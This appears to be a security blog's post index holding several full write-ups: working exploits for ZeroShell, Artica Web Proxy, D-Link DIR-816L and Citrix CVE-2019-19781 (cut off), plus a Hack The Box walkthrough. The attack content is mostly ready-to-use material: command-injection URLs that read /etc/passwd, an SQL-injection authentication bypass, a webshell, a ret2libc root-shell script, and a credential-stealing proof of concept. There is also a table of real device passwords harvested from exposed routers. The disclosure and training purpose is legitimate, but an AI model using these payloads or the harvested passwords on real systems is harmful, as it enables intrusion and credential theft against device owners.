https://research.nccgroup.com/2020/06/15/striking-back-at-retired-cobalt-strike-a-look-at-a-legacy-vulnerability  https://github.com/rapid7/metasploit-framework/blob/7a6a124272b7c52177a540317c710f9a3ac925aa/lib/rex/payloads/meterpreter/uri_checksum.rb  https://blogs.jpcert.or.jp/en/2018/08/volatility-plugin-for-detecting-cobalt-strike-beacon.html  https://www.cobaltstrike.com/help-malleable-c2  https://blog.cobaltstrike.com/2019/02/19/cobalt-strike-team-server-population-study/  https://github.com/Sentinel-One/CobaltStrikeParser/blob/master/parse_beacon_config.py  https://github.com/whickey-r7/grab_beacon_config/blob/main/grab_beacon_config.nse  https://blog.cobaltstrike.com/2016/06/15/what-is-a-stageless-payload-artifact/  http://blog.leanote.com/post/snowming/62ec1132a2c9"
  },
  
  {
    "title": "ZeroShell Linux Router 3.9.3 OS Command Injection vulnerability(CVE-2020-29390)",
    "url": "/posts/zeroshell_linux_router_rce/",
    "categories": "vulnerability, ZeroShell",
    "tags": "",
    "date": "2020-08-09 12:13:00 +0800",
    





    
    "snippet": "Vendor:Zeroshell Linux Routerhttps://zeroshell.org/Product:ZeroShell-3.9.3-X86.isohttps://zeroshell.org/download/  Zeroshell is a Linux based distribution dedicated to the implementation of Router ...",
    "content": "Vendor:Zeroshell Linux Routerhttps://zeroshell.org/Product:ZeroShell-3.9.3-X86.isohttps://zeroshell.org/download/  Zeroshell is a Linux based distribution dedicated to the implementation of Router and Firewall Appliances completely administrable via web interface. &gt; Zeroshell is available for x86/x86-64 platforms and ARM based devices such as Raspberry Pi.OS Command InjectionWhen I reviewed the earlier vulnerabilities in zeroshell, I discovered that an OS Command Injection vulnerability still exists in its latest version.You can download here.Payload: /cgi-bin/kerbynet?Action=StartSessionSubmit&amp;User='%0acat /etc/passwd%0a'&amp;PW=Reference  Zeroshell 3.6.0/3.7.0 Net Services - Remote Code Execution  https://cwe.mitre.org/data/definitions/78.html"
  },
  
  {
    "title": "Artica Web Proxy 4.30 Authentication Bypass & OS Command Injection",
    "url": "/posts/artica_proxy/",
    "categories": "vulnerability, Artica",
    "tags": "",
    "date": "2020-08-09 12:13:00 +0800",
    





    
    "snippet": "2024-03-01 UPDATEI don’t know when Artica updated the source code for 4.30, filtering the api_key parameter, which resulted in the original payload becoming ineffective.&lt;?phpfunction apikey(){  ...",
    "content": "2024-03-01 UPDATEI don’t know when Artica updated the source code for 4.30, filtering the api_key parameter, which resulted in the original payload becoming ineffective.&lt;?phpfunction apikey(){    $tpl=new template_admin();    $md5=$tpl-&gt;CLEAN_BAD_CHARSNET($_GET[\"apikey\"]);    webconsole_syslog(\"API KEY START WITH: {$_GET[\"apikey\"]}\");    $AuthLinkRestrictions=unserialize(base64_decode($GLOBALS[\"CLASS_SOCKETS\"]-&gt;GET_INFO(\"AuthLinkRestrictions\")));    if(!is_array($AuthLinkRestrictions)){$AuthLinkRestrictions=array();}    if(count($AuthLinkRestrictions)==0){        $AuthLinkRestrictions[] = \"192.168.0.0/16\";        $AuthLinkRestrictions[] = \"10.0.0.0/8\";        $AuthLinkRestrictions[] = \"172.16.0.0/12\";    }    $IPADDR=GetRemoteIP();    $PASS_IPADDR=false;    foreach ($AuthLinkRestrictions as $cdir){        if(webconsole_ip_in_range($IPADDR,$cdir)){            $PASS_IPADDR=true;            break;        }    }Vendor:www.articatech.comProduct:Artica Web Proxy v4.30.000000Download: http://www.articatech.com/download.php  *Proxy Cache and Web filtering ApplianceArtica Proxy is a system that provide a sexy Web Ajax console in order manage a full Proxy server without any technical skill and with latest Squid technology.It provide surls filtering with french Toulouse University and Artica database - over 30.000.000 websites.There are many statistics per users or categories or websites and features in order to manage Internet bandwith.It provides FireWall/QOS features.Can work in Transparent mode or connected to an Activ Directory/OpenLDAP members database.Authentication Bypass (CVE-2020-17506)Artica provides an API interface in fw.login.php for authentication. The parameter apikey has a SQL injection vulnerability, an attacker can forge a $_SESSION[\"uid\"] by co-injection to log in any user. In the code, $_SESSION[\"uid\"] == \"-100\" indicates that the current user is SuperAdmin.The next step is to construct a local array to commit to.https://172.16.237.222:9000/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;OS Command Injection (CVE-2020-17505)After successfully bypassing authentication to get admin access, I tried this to find out more about the problem that allowed me to get root access.Where cyurs.index.php is loaded with cyurs.php and the unchecked parameter service_cmds_peform is passed into the service_cmds function and called.payload: https://172.16.237.222:9000/cyrus.index.php?service-cmds-peform=||whoami||Eventually I managed to execute the command with root privileges.Reference  https://cwe.mitre.org/data/definitions/78.html  https://cwe.mitre.org/data/definitions/592.htmlTimeLine  2020-08-08: Vulnerability found and submitted to vendor with no response.  2020-08-12: Submitted to CVE.  2020-08-13: CVE Confirms Vulnerability."
  },
  
  {
    "title": "HTB October Walkthrough",
    "url": "/posts/htb-October/",
    "categories": "CTF, HTB",
    "tags": "",
    "date": "2020-08-08 12:13:00 +0800",
    





    
    "snippet": "InformationDescription  name: October  OS: Linux  Difficulty: Medium  Points: 30  Release: 20 Mar 2017  IP: 10.10.10.16https://www.hackthebox.eu/home/machines/profile/15October was difficult for me...",
    "content": "InformationDescription  name: October  OS: Linux  Difficulty: Medium  Points: 30  Release: 20 Mar 2017  IP: 10.10.10.16https://www.hackthebox.eu/home/machines/profile/15October was difficult for me in the late stages. After an early recon, I was stuck above the buffer overflow. After watching the ippsec video, I seem to be starting to get an idea of such problems.Summary  Discovery of vulnerabilities in web applications.  Get web backend permissions  Uploading a webshell  Discovery of SUID executable procedures  Buffer overflowDetailsReconNmapmaxox4141@ec3p0:~/HTB/october$ sudo nmap -sS -sV -sC 10.10.10.16 -oN nmap[sudo] elloit 的密码：Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-05 19:29 CSTNmap scan report for 10.10.10.16Host is up (0.38s latency).Not shown: 998 filtered portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))| http-methods:|_  Potentially risky methods: PUT PATCH DELETE|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: October CMS - VanillaService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 46.70 secondsPort 80:The machine seems to have HTTP PUT enabled on port 80, so I could just use this method to upload a Trojan horse if I could. But after testing, this method does not work.After that I found a web application running on port 80 as October. I started to search the internet for the vulnerability. I found this.：  https://bitflipper.eu/finding/2017/04/october-cms-v10412-several-issues.htmlCVE-2017-1000119Files that are executed as PHP are:  .php  .php3  .php4  .php5  .pht  .phtml  .php7 // in newer settingsSo we can upload a file with a php5 extension and it can be executed as PHP. To exploit this vulnerability, we need to log in to the backend. After a bit of searching, we find the backend link is http://10.10.10.16//backend/, which can be logged in using admin:admin.Got Web ShellUpload WEB SHELL using CVE-2017-1000119:Now I can execute the command via http://10.10.10.16/storage/app/media/shell.php5?cmd=ls.user.txtwww-data@october:/home/harry$ cat user.txtcat user.txt29161ca87aa3d34929dc46efc40c89c0www-data@october:/home/harry$/etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinlibuuid:x:100:101::/var/lib/libuuid:syslog:x:101:104::/home/syslog:/bin/falsemysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/falsemessagebus:x:103:107::/var/run/dbus:/bin/falselandscape:x:104:110::/var/lib/landscape:/bin/falsesshd:x:105:65534::/var/run/sshd:/usr/sbin/nologinharry:x:1000:1000:Harry Varthakouris,,,:/home/harry:/bin/bashView source code to discover the associated database password.'connections' =&gt; [        'sqlite' =&gt; [                                                                                                              'driver'   =&gt; 'sqlite',                                                                                                'database' =&gt; 'storage/database.sqlite',                                                                               'prefix'   =&gt; '',                                                                                                  ],                                                                                                                 'mysql' =&gt; [                                                                                                               'driver'    =&gt; 'mysql',                                                                                                'host'      =&gt; 'localhost',                                                                                            'port'      =&gt; '',                                                                                                     'database'  =&gt; 'october',                                                                                              'username'  =&gt; 'october',                                                                                              'password'  =&gt; 'OctoberCMSPassword!!',                                                                                 'charset'   =&gt; 'utf8',                                                                                                 'collation' =&gt; 'utf8\\_unicode\\_ci',                                                                                      'prefix'    =&gt; '',                                                                                                 ],                                                                                                                  'pgsql' =&gt; [                                                                                                               'driver'   =&gt; 'pgsql',                                                                                                 'host'     =&gt; 'localhost',                                                                                             'port'     =&gt; '',                                                                                                      'database' =&gt; 'database',                                                                                              'username' =&gt; 'root',                                                                                                  'password' =&gt; '',                                                                                                      'charset'  =&gt; 'utf8',                                                                                                  'prefix'   =&gt; '',                                                                                                      'schema'   =&gt; 'public',        ],        'sqlsrv' =&gt; [            'driver'   =&gt; 'sqlsrv',            'host'     =&gt; 'localhost',            'port'     =&gt; '',             'database' =&gt; 'database',            'username' =&gt; 'root',            'password' =&gt; '',             'prefix'   =&gt; '',         ],    ],But after some testing, this password seems useless. Using find / -perm -u=s -type f 2&gt;/dev/null found that./bin/umount/bin/ping/bin/fusermount/bin/su/bin/ping6/bin/mount/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/bin/sudo/usr/bin/newgrp/usr/bin/pkexec/usr/bin/passwd/usr/bin/chfn/usr/bin/gpasswd/usr/bin/traceroute6.iputils/usr/bin/mtr/usr/bin/chsh/usr/bin/at/usr/sbin/pppd/usr/sbin/uuidd/usr/local/bin/ovrflwPrivilege escalationWhen I saw /usr/local/bin/ovrflw, I knew what to do next.www-data@october:/home/harry/.composer/cache/files$ ovrflw AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                     Segmentation fault (core dumped)www-data@october:/home/harry/.composer/cache/files$There is definitely a buffer overflow vulnerability, but that’s all I know about with this vulnerability. Very embarrassing. But I’m going to try anyway.The first time, I downloaded the ovrflw file and decompiled it using ghidra.Pseudocode.：undefined4 main(int param_1,undefined4 \\*param_2){  char local_74 [112];    if (param_1 &lt; 2) {    printf(\"Syntax: %s &lt;input string&gt;\\n\",\\*param_2);    /\\* WARNING: Subroutine does not return \\*/    exit(0);  }  strcpy(local_74,(char \\*)param_2[1]);  return 0;}Obviously, an overflow will occur if the user enters more than 112 characters, and I verified this again using the ippsec method.0x534F4150@c3p0:~/HTB/october$ locate pattern_/usr/bin/msf-pattern_create/usr/bin/msf-pattern_offset/usr/lib/dradis/ruby/2.7.0/gems/mustermann-1.1.1/lib/mustermann/pattern_cache.rb/usr/lib/dradis/ruby/2.7.0/gems/mustermann-1.1.1/spec/pattern_spec.rb/usr/lib/dradis/ruby/2.7.0/gems/mustermann-1.1.1/spec/to_pattern_spec.rb/usr/share/metasploit-framework/modules/exploits/unix/webapp/wp_holding_pattern_file_upload.rb/usr/share/metasploit-framework/tools/exploit/pattern_create.rb/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/erubis-2.7.0/test/data/users-guide/bipattern_example.result/usr/share/rubygems-integration/all/gems/mustermann-1.1.1/lib/mustermann/pattern_cache.rbFor buffer overflow vulnerabilities, you can use the pattern_create.rb script in Metasploit to generate character sequences.0x534F4150@c3p0:~/HTB/october$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag0x534F4150@c3p0:~/HTB/october$So, we have 0x64413764, and next use /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb to find the exact number of bytes.0x534F4150@c3p0:~/HTB/october$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x64413764[\\*] Exact match at offset 1120x534F4150@c3p0:~/HTB/october$You can see that PIE(Position-Independent Executable) is partially enabled, which means that ovrflow loads the DLL i address randomly at runtime.elloit@ubuntu:~/code$ for i in `seq 0 20`;do ldd ovrflw | grep libc ; donelibc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7598000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb752d000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75f9000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7517000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7576000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75cb000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb753a000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7553000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb755f000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75d5000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb754c000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7539000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7518000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7526000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75ba000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7537000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7529000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7586000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75a5000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7557000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75f6000)elloit@ubuntu:~/code$However, there is a pattern, the prefix 0xb7 and the suffix 000 are fixed, with only three of them changing.Let’s move on to the buffer overflow. After searching for a buffer, a payload is constructed as follows: function adderss, exit address, argr address. If we want to get SHELL, we need to know the address of the function system and the address of the parameter /bin/sh.  system_addresss = libc_base_address + system_off  exit_address = libc_base_address + exit_off  argr_address = libc_base_address + argr_offlibc_base_address=0xb7598000system_off: 00040310elloit@ubuntu:~/code$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system243: 0011b8a0    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0620: 00040310    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0elloit@ubuntu:~/code$exit_off: 00033260elloit@ubuntu:~/code$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit111: 00033690    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0446: 000336d0   268 FUNC    GLOBAL DEFAULT   12 __cxa_thread_atexit_impl@@GLIBC_2.18554: 000b8634    24 FUNC    GLOBAL DEFAULT   12 _exit@@GLIBC_2.0609: 0011e780    56 FUNC    GLOBAL DEFAULT   12 svc_exit@@GLIBC_2.0645: 00033660    45 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10868: 00033490    84 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.31037: 00128ce0    60 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.01380: 001ad204     4 OBJECT  GLOBAL DEFAULT   31 argp_err_exit_status@@GLIBC_2.11492: 000fb610    62 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.02090: 001ad154     4 OBJECT  GLOBAL DEFAULT   31 obstack_exit_failure@@GLIBC_2.02243: 00033290    77 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.02386: 000fc180     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2elloit@ubuntu:~/code$argr_off: 162d4celloit@ubuntu:~/code$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh162d4c /bin/shelloit@ubuntu:~/code$So we can write the following code:buff.py:from subprocess import callimport structlibc_base_addr = 0xb7602000system_off = 0x00040310exit_off = 0x00033260args_off =   0x00162bacsystem_addr = struct.pack(\"&lt;I\", libc_base_addr + system_off)exit_addr = struct.pack(\"&lt;I\", libc_base_addr + exit_off)arg_addr = struct.pack(\"&lt;I\", libc_base_addr+ args_off)buf = \"A\" * 112buf += system_addrbuf += exit_addrbuf += arg_addri = 0while(i &lt; 512):i += 1ret = call([\"/usr/local/bin/ovrflw\", buf])root.txt# cat root.txtcat root.txt6bcb9cff749c9318d2a6e71bbcf30318# "
  },
  
  {
    "title": "CVE-2020-15894 D-Link DIR-816L信息泄露漏洞",
    "url": "/posts/DIR816L/",
    "categories": "vulnerability, D-Link",
    "tags": "",
    "date": "2020-02-28 12:13:00 +0800",
    





    
    "snippet": "背景今天发现了 CVE-2020-15894 D-Link DIR-816L信息泄露漏洞。            项      描述                  CVE编号      CVE-2020-15894              漏洞等级      高危              CNNVD编号      CNNVD-202007-1376              影响厂商...",
    "content": "背景今天发现了 CVE-2020-15894 D-Link DIR-816L信息泄露漏洞。            项      描述                  CVE编号      CVE-2020-15894              漏洞等级      高危              CNNVD编号      CNNVD-202007-1376              影响厂商      dlink友讯科技股份有限公司              影响固件      dir-816l_firmware              检索语法      “dlink友讯科技股份有限公司.dir-816l_firmware”              指纹      “target=”_blank”&gt;DIR-816L”              危害      泄漏各种配置信息，包含设备密码。      漏洞详情NVD对漏洞的描述：  An issue was discovered on D-Link DIR-816L devices 2.x before 1.10b04Beta02. There exists an exposed administration function in getcfg.php, which can be used to call various services. It can be utilized by an attacker to retrieve various sensitive information, such as admin login credentials, by setting the value of _POST_SERVICES in the query string to DEVICE.ACCOUNT.问题出在getcfg.php中。(DIR-8XX系列中网上公布的有现有的Pyaload，此次和以前不一样的是请求方法为GET，参数为_POST_SERVICE)固件下载：http://legacyfiles.us.dlink.com/使用fat模拟固件运行环境，如图。使用nb进行转发，使得外部能够访问。ssh登录，得到getcfg.php，漏洞利用点在$file = \"/htdocs/webinc/getcfg/\".$GETCFG\\_SVC.\".xml.php\";/\\* GETCFG\\_SVC will be passed to the child process. \\*/if (isfile($file)==\"1\") dophp(\"load\", $file);到达此步需要绕过is_power_user函数。固件处理请求的函数均在cgibin中。function is_power_user(){\tif($_GLOBALS[\"AUTHORIZED_GROUP\"] == \"\")\t{\t\treturn 0;\t}\tif($_GLOBALS[\"AUTHORIZED_GROUP\"] &lt; 0){\t\treturn 0;\t}\treturn 1;}if ($_POST[\"CACHE\"] == \"true\"){\techo dump(1, \"/runtime/session/\".$SESSION_UID.\"/postxml\");}else{\tif(is_power_user() == 1)\t{\t\t/* cut_count() will return 0 when no or only one token. */\t\t$SERVICE_COUNT = cut_count($_POST[\"SERVICES\"], \",\");\t\tTRACE_debug(\"GETCFG: got \".$SERVICE_COUNT.\" service(s): \".$_POST[\"SERVICES\"]);\t\t$SERVICE_INDEX = 0;\t\twhile ($SERVICE_INDEX &lt; $SERVICE_COUNT)\t\t{\t\t\t$GETCFG_SVC = cut($_POST[\"SERVICES\"], $SERVICE_INDEX, \",\");\t\t\tTRACE_debug(\"GETCFG: serivce[\".$SERVICE_INDEX.\"] = \".$GETCFG_SVC);\t\t\tif ($GETCFG_SVC!=\"\")\t\t\t{\t\t\t\t$file = \"/htdocs/webinc/getcfg/\".$GETCFG_SVC.\".xml.php\";\t\t\t\t/* GETCFG_SVC will be passed to the child process. */\t\t\t\tif (isfile($file)==\"1\") dophp(\"load\", $file);\t\t\t}\t\t\t$SERVICE_INDEX++;\t\t}\t}\telse\t{\t\t/* not a power user, return error message */\t\techo \"\\t&lt;result&gt;FAILED&lt;/result&gt;\\n\";\t\techo \"\\t&lt;message&gt;Not authorized&lt;/message&gt;\\n\";\t}}反编译cgibin找到main函数，phpcgi处理相应的php的请求。phpcgi_main: 判断请求方法，Payload为GET则调用FUN_00405798。可以看到FUN_00405798将数据处理，以0x3d(=号)形成键值对参数，每个键前加上_GET_前缀。各个键值对之间以10(ascii码 \\n)分割。payload在经过处理后变成了_GET_a=\\n_POST_SERVICES=DEVICE.ACCOUNT\\nAUTHORIZED_GROUP=1。最终以\\n进行分割。导致_POST_SERVICES=DEVICE.ACCOUNT和AUTHORIZED_GROUP=1被分离出来。造成认证绕过。这也是此次GET请求中直接使用_POST_SERVICES而不是SERVICES的原因。命中结果分析收集了此次命中目标使用的密码。组成了一个字典。使用频率前十如下表：            次数      密码                  206      28001277              36      admin              25      qu4dk3y              25      boila1!              22      bonev47              21      r9112014              21      4163915581              19      oidtbmav1              19      JZax]Cd9”09qo              19      isiap1      验证代码#!/usr/bin/python# -*- coding: utf-8 -*-# Time : 2020/7/28 下午6:31# Author : Morty Jin# File : info_leak.py# Email : imelloit@gmail.com# copyright: (c) 2020 by Morty Jin.# license: Apache2, see LICENSE for more details.# description: Life is Fantastic.import jsonfrom urllib.parse import urlparsefrom lxml import etreefrom pocsuite3.api import Outputfrom pocsuite3.api import POCBasefrom pocsuite3.api import register_pocimport requests as reqclass TestPOC(POCBase):  vulID = ''  version = ''  author = [\"\"]  vulDate = ''  createDate = ''  updateDate = ''  references = [\"\"]  name = \"\"  appPowerLink = ''  appName = ''  appVersion = ''  vulType = ''  desc = '''    '''  samples = [  ]  install_requires = ['']  search_keyword = ''  def _attack(self):    result = {}    #Write your code here    return self.parse_output(result)  def _verify(self):    result = {}    self.raw_url = self.url    host = urlparse(self.url).hostname    port = urlparse(self.url).port    scheme = urlparse(self.url).scheme    if port is None:      port = \"80\"    else:      port = str(port)    if \"https\" == scheme:      self.url = \"%s://%s\" % (scheme, host)    else:      self.url = \"%s://%s:%s\" % (scheme, host, port)    # Write your code here    try:      res = self.get_info()      if res:        username, password = res        result[\"url\"] = self.url        # 单位信息，能够精准获取到的单位名称        result[\"unit_name\"] = \"\"        # Web网站相关信息        result[\"web\"] = {          # 网站默认首页的title信息（可能含有单位或组织信息）          # \"title\":\"\"        }        # 凭据类信息，针对各类弱口令、默认口令漏洞        result[\"login_credentials\"] = [          {\"username\": username, \"password\": password, \"credential_type\": \"网站后台\"},        ]    except Exception as e:      pass    return self.parse_output(result)  def get_info(self):    headers = {      \"User-Agent\": \"googlr spider\"    }    payload = \"/getcfg.php?a=%0A_POST_SERVICES%3DDEVICE.ACCOUNT%0AAUTHORIZED_GROUP%3D1\"    try:      res = req.get(url=self.url + payload, timeout=30, headers=headers)      if res.status_code == 200 and \"DEVICE.ACCOUNT\" in res.text:        page = etree.XML(res.content)        username = page.xpath(\"/postxml/module/device/account/entry/name/text()\")        password = page.xpath(\"/postxml/module/device/account/entry/password/text()\")        print(username, password)        return (username, password)    except Exception as e:      pass    return ()  def parse_output(self, result):    output = Output(self)    if len(result.keys()) != 0:      json_result = {        \"result\": {\"json\": json.dumps(result)}      }      output.success(json_result)    else:      output.fail('Internet nothing returned')    return outputregister_poc(TestPOC)其它这个漏洞是DIR-8XX的老问题了，不过之前的Payload的都为POST提交i的且参数也不一致。之前的Payload测试同样能够成功："
  },
  
  {
    "title": "CVE-2019-19781 Citrix Application DC & Citrix Gateway RCE",
    "url": "/posts/cve-2019-19781-citrix-rce/",
    "categories": "vulnerability, Citrix",
    "tags": "RCE",
    "date": "2020-01-10 11:33:00 +0800",
    





    
    "snippet": "AnalysisTwo steps:  Use path traversal request newbm.pl to write to xml file (1sh HTTP request).  Template toolkit load and parse the xml file(2nd Request).Path TraversalIn the published payload, y...",
    "content": "AnalysisTwo steps:  Use path traversal request newbm.pl to write to xml file (1sh HTTP request).  Template toolkit load and parse the xml file(2nd Request).Path TraversalIn the published payload, you can see that the problem is under the vpns folder. We were able to find useful informationin the http.conf file:Alias /vpns/portal/scripts/ /netscaler/portal/scripts/...PerlSetEnv portalLoc /vpns/portal/PerlSetEnv PortalRoot /netscaler/PerlRequire /netscaler/portal/utils/startup.plPerlModule NetScaler::Portal::Handler&lt;Location /vpns/portal/&gt;SetHandler perl-scriptPerlResponseHandler NetScaler::Portal::HandlerPerlSendHeader On&lt;/Location&gt;In the payload you can find the http post request header:NSC\\_NONCE: nsrootNSC\\_USER: ../../../netscaler/portal/templates/12603aafWe find NSC_USER int the /netscaler/portal/modules/NetScaler/Portal/UserPrefs.pmWe can see that the username comes from the NSC_USER field in the http request and is spliced into the filename.So we can specify any file under vpns.This code is encapsulated in a csd function, and all code that calls this methodwill have problems.my $username = Encode::decode('utf8', $ENV{'HTTP_NSC_USER'}) || errorpage(\"Missing NSC_USER header.\");$self-&gt;{username} = $username;  ...$self-&gt;{session} = %session;$self-&gt;{filename} = NetScaler::Portal::Config::c-&gt;{bookmark_dir} . Encode::encode('utf8', $username) . '.xml';I found two points.handler.pm:$r-&gt;no\\_cache(1);my $user = NetScaler::Portal::UserPrefs-&gt;new();my $doc = $user-&gt;csd();newbm.pl:my $cgi = new CGI;my $user = NetScaler::Portal::UserPrefs-&gt;new();my $doc = $user-&gt;csd();Further found that you can write files in newbm.pl.my $doc = $user-&gt;csd();#disallow get requests to make it difficult to launch XSRF attacksif ($ENV{'REQUEST\\_METHOD'} ne 'POST') {my $msg = \"Access Denied\";print \"Location: \" . $ENV{portalLoc} . \"error.html?$msg\\n\\n\";  exit;}my $newurl = Encode::decode('utf8', $cgi-&gt;param('url'));my $newtitle = Encode::decode('utf8', $cgi-&gt;param('title'));my $newdesc = Encode::decode('utf8', $cgi-&gt;param('desc'));my $UI\\_inuse = Encode::decode('utf8', $cgi-&gt;param('UI\\_inuse'));...$user-&gt;filewrite($doc);The generated file is as follows.&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;user username=\"../../../netscaler/portal/templates/2d13335a\"&gt;  &lt;bookmarks&gt;    &lt;bookmark UI\\_inuse=\"\" descr=\"[% template.new('BLOCK' = 'print `cat /etc/passwd`') %]\" title=\"2d13335a\" url=\"http://example.com\" /&gt;  &lt;/bookmarks&gt;  &lt;escbk&gt;  &lt;/escbk&gt;  &lt;filesystems&gt;&lt;/filesystems&gt;  &lt;style&gt;&lt;/style&gt;&lt;/user&gt;Template Process the xmlCitrix uses Template Toolkit to parse templates.The second request for /vpn/../vpns/portal/youfilename.xml, this operation will be handled by the Handler module.my $tmplfile = $r-&gt;path\\_info();$tmplfile =~ s[^/][];my $template = Template-&gt;new({INCLUDE\\_PATH =&gt;  NetScaler::Portal::Config::c-&gt;{template\\_dir},CACHE\\_SIZE =&gt; 64, COMPILE\\_DIR=&gt; NetScaler::Portal::Config::c-&gt;{template\\_compile\\_dir}, COMPILE\\_EXT =&gt; '.ttc2'});if ($tmplfile =~/.\\*\\.css$/){  $r-&gt;send\\_http\\_header('text/css');} else {  $r-&gt;send\\_http\\_header('text/html');}$template-&gt;process($tmplfile, $doc) || do {  my $error = $template-&gt;error();  my $lcError = lc($error);  if ( $error-&gt;type() eq \"file\" &amp;&amp; $lcError  =~ /^file error/ &amp;&amp; $lcError =~ /.not found$/ ) {  return NOT\\_FOUND;}  print NetScaler::Pcsd ortal::UserPrefs::html\\_escape\\_string($error), \"\\n\";};Template Toolkit can eval perl without EVAL_PERL.We use tpage for testing.Re-AppearDownload: https://www.citrix.com/downloads/citrix-gateway/product-software/citrix-gateway-13-0-build-36-27.htmlInstall in VMware:You need to configure the IpAddress GetWay &amp; Mask. You can Login the virtual machine 